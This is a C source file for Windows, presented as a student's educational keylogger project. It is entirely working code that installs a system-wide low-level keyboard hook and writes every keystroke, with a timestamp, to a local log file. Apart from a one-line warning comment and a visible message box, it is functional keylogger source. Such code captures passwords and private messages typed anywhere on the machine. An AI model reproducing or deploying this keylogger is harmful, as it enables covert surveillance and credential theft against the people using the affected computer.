// Educational Keylogger in C (Windows)
// Author: BSCS Student - For Semester Project
// Level: Intermediate | Purpose: OS Learning
// WARNING: Use only in controlled, ethical environments.

#include <windows.h>
#include <stdio.h>
#include <time.h>

#define LOG_FILE "keylog.txt"

HHOOK keyboardHook;

void log_key_event(const char* key) {
    FILE* log = fopen(LOG_FILE, "a");
    if (log == NULL) return;

    time_t t;
    struct tm* tm_info;
    char time_str[26];
    time(&t);
    tm_info = localtime(&t);
    strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S", tm_info);

    fprintf(log, "[%s] %s\n", time_str, key);
    fclose(log);
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = kbStruct->vkCode;
        char key[32] = {0};

        // Translate virtual key code to a string
        if (vkCode >= 'A' && vkCode <= 'Z') {
            key[0] = (char)vkCode;
        } else if (vkCode >= '0' && vkCode <= '9') {
            key[0] = (char)vkCode;
        } else {
            switch (vkCode) {
                case VK_SPACE: strcpy(key, "SPACE"); break;
                case VK_RETURN: strcpy(key, "ENTER"); break;
                case VK_BACK: strcpy(key, "BACKSPACE"); break;
                case VK_TAB: strcpy(key, "TAB"); break;
                case VK_SHIFT: strcpy(key, "SHIFT"); break;
                case VK_CONTROL: strcpy(key, "CTRL"); break;
                case VK_MENU: strcpy(key, "ALT"); break;
                case VK_ESCAPE: strcpy(key, "ESCAPE"); break;
                default: sprintf(key, "VK_%d", vkCode); break;
            }
        }

        log_key_event(key);
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    MSG msg;

    // Set the keyboard hook
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (keyboardHook == NULL) {
        MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
        return 1;
    }

    MessageBox(NULL, "Keylogger running.\nClose this message box to stop.", "Info", MB_OK);

    // Message loop
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyboardHook);
    return 0;
}
